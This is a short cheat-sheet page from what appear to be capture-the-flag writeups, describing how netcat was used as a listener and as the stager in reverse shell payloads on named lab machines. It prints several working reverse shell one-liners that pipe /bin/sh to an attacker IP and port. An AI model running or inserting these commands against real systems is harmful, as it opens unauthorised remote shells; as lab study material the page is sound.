# netcat (nc)

Swiss-army knife for TCP/UDP connections. In these writeups, primarily used as a reverse shell listener on the attacker side and as the stager inside reverse shell payloads.

## Commands Used

### Start a listener
```bash
nc -lvnp 4444
```
Used on: **Kobold**, **Silentium**, **CCTV**, **DevArea**

- `-l` — listen mode
- `-v` — verbose
- `-n` — no DNS resolution
- `-p` — port number

### FIFO-based reverse shell (Alpine with limited `nc`)
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.91 4444 >/tmp/f
```
Used on: **Silentium** (Flowise MCP payload)

### Classic `-e` reverse shell
```bash
nc -e /bin/sh ATTACKER_IP PORT
```
Referenced in: **Silentium**, **CCTV**

### Reverse shell from inside Docker via exec
```bash
nc 10.10.15.57 5555 -e /bin/sh
```
Used on: **MonitorsFour**
